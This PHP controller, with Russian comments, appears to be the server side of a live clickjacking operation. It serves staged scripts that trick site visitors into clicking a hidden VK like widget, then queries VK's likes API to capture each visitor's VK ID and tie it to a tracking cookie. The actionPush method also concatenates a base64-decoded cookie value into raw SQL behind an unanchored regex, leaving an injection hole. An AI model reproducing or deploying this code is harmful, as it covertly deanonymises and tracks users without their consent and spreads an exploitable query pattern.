<?php

    namespace app\controllers\clickjacks;

    use app\components\inheritance\DefinitionsComponent;
    use app\models\Domain;
    use app\models\Clickjack;
    use app\models\Client;
    use app\components\helpers\CJ;

    use app\models\VKHistory;
    use Yii;

    /**
     * Class VkController
     *
     * Класс для работы с перехватом VK_ID через клик-джекинг кнопки like
     *
     * @package app\controllers\clickjacks
     */
    class VkController extends DefinitionsComponent
    {
        /**
         * Проверяет наличие и активность домена в БД по параметру $_GET['_']
         * Используется при подключении клиентского кода j.js?_=md5(id+salt), где id - ID домена в базе
         *
         * @return false|\yii\db\ActiveRecord
         */
        public function getDomain() {
            if (!empty($_GET['_']) && preg_match("/^[a-z0-9]{32}$/", $_GET['_'])) {
                $Domain = Domain::findBySql("SELECT * FROM {{%domains}} WHERE MD5(CONCAT_WS('', id, '".Client::$salt."')) = '" . $_GET['_'] . "'")->one();

                if (!empty($Domain) && $Domain->isActive()) {
                    return $Domain;
                }
            }

            return false;
        }

        /**
         * Кликджекинг ВК, шаг 1.
         * В целях обхода "небезопасного" скрипта создается iFrame средствами JS.
         *
         * @return string
         */
        public function actionStage0() {
            Yii::$app->response->format = \yii\web\Response::FORMAT_RAW;
            $headers = Yii::$app->response->headers;
            $headers->add("Content-Type", 'application/javascript');

            $Domain = $this->getDomain();

            if (!empty($Domain)) {
                $this->data->appId = Yii::$app->params['vk']['appId'];
                $this->data->token = $Domain->getToken(Client::$salt);
                $this->data->cookieName = Yii::$app->params['cookieName'];
                $this->data->domainId = $Domain->id;

                # TODO: минификация всех стадий после окончательного тестирования, чтобы не тырили

                return $this->renderPartial('stage-0');
            }

            return '';
        }

        /**
         * Кликджекинг ВК, шаг 2.
         * Проверяем авторизованность ВК, инициализируя авторизацию и проверяя высоту блока, !!! 92px может изменится
         * в любой момент, решение временное.
         *
         * Инициализируем лайк-виджет для рандомной страницы рандомной группы и вешаем событие на перетаскивание
         * мышкой блока с лайком.
         *
         * @return string
         */
        public function actionStage1() {
            $Domain = $this->getDomain();

            if (!empty($Domain)) {
                $this->data->appId = Yii::$app->params['vk']['appId'];
                $this->data->token = $Domain->getToken(Client::$salt);
                $this->data->cookieName = Yii::$app->params['cookieName'];
                $this->data->cookieShortName = Yii::$app->params['cookieShortName'];
                $this->data->host = $Domain->host;
                $this->data->domainId = $Domain->id;

                return $this->renderPartial('stage-1');
            }

            return '';
        }

        /**
         * Кликджекинг ВК, получение ID юзера, лайкнувшего страницу группы.
         * @param $AppId
         * @param $Host
         * @param $GroupId
         * @return
         */
        private function getId($AppId, $Host, $GroupId) {
            $decoded = @json_decode(@file_get_contents('https://api.vk.com/method/likes.getList?type=sitepage&owner_id='.$AppId.'&page_url='.$Host.'?mypp='.$GroupId));
            return @$decoded->response->users[0];
        }

        /**
         * Кликджекинг ВК, шаг 3.
         * Сохраняем ID пользователя ВК посредством публичного API
         *
         * @return string|boolean
         */
        public function actionSave()
        {
            $Domain = $this->getDomain();
            if ($Domain) {
                $groupId = $_POST['guid'];

                $mycc = false;
                for($k=0;$k<=3;$k++) {
                    if (!$mycc) {
                        $mycc = $this->getId(Yii::$app->params['vk']['appId'], $Domain->host, $groupId);
                    }
                }

                if (empty($mycc)) {
                    VKHistory::push('api_error');
                } else {
                    VKHistory::push('api_ok');
                }
/*
                # Сохраняем кликджек
                $ClickJack = new Clickjack();
                $ClickJack->type = 'vk';
                $ClickJack->user_id = $Domain->user_id;
                $ClickJack->domain_id = $Domain->id;
                $ClickJack->vk_id = $mycc;
                $ClickJack->creation_time = date('Y-m-d H:i:s');
                $ClickJack->save();


                # Ставим куку
                $CookieName = CJ::setCookie($Client->vk_id, 0, 0);
                //$CookieName = md5($Client->id . Client::$salt);
                //$CookieNameBase64 = base64_encode($CookieName);

                # Привязываем куку к клиенту
                if (empty($Client->cookie) || $Client->cookie != $CookieName) {
                    $Client->cookie = $CookieName;
                    $Client->save();
                }*/

                return $mycc;
            }

            return 'error';
        }

        /**
         * Сохраняем короткую куку amsid клиента для дальнейшей работы с u.admeo.ru
         *
         * @return void 1x1;
         */
        public function actionCsave() {
            if (!empty($_COOKIE[Yii::$app->params['cookieShortName']])) {
                $ClientCheck = Client::findOne(['cookie'=>$_COOKIE[Yii::$app->params['cookieShortName']]]);
                if (empty($ClientCheck)) {
                    $Client = new Client();
                    $Client->cookie = $_COOKIE[Yii::$app->params['cookieShortName']];
                    $Client->save();
                }
            }
            $this->return1x1();
        }

        /**
         * Лог запросов
         *
         * @return string|boolean
         */

        public function actionPush() {
            $AllowedActions = ['load', 'new', 'exists', 'check_auth_fail', 'frame_click', 'save_id'];

            if (!empty($_GET['type']) && in_array($_GET['type'], $AllowedActions)) {
                if (!empty($_GET['cookie']) && preg_match("/[a-zA-Z0-9\=]/is", $_GET['cookie'])) {
                    $Client = Client::findBySql("SELECT * FROM {{%clients}} WHERE MD5(CONCAT_WS('', id, '".Client::$salt."')) = '" . base64_decode($_GET['cookie']) . "'")->one();
                }

                VKHistory::push($_GET['type'], ( !empty($Client) ? $Client->id : null ));
            }

            die('ok');
        }
    }


?>